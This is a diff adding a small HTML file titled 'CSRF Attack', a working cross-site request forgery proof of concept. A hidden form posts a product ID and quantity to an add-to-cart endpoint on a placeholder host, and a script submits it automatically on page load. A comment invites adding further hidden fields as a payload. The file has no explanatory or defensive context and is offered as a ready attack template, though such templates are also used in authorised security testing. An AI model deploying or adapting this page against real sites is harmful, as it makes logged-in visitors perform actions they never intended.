@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack</title>
+</head>
+<body>
+  <h1>CSRF Attack</h1>
+  <form id="csrfForm" action="http://target-website.com/add-to-cart" method="POST">
+    <input type="hidden" name="product_id" value="123">
+    <input type="hidden" name="quantity" value="1">
+    <!-- Add more hidden fields as required for your payload -->
+    <input type="submit" value="Add to Cart">
+  </form>
+
+  <script>
+    // Automatically submit the form when the page loads
+    document.getElementById("csrfForm").submit();
+  </script>
+</body>
+</html>
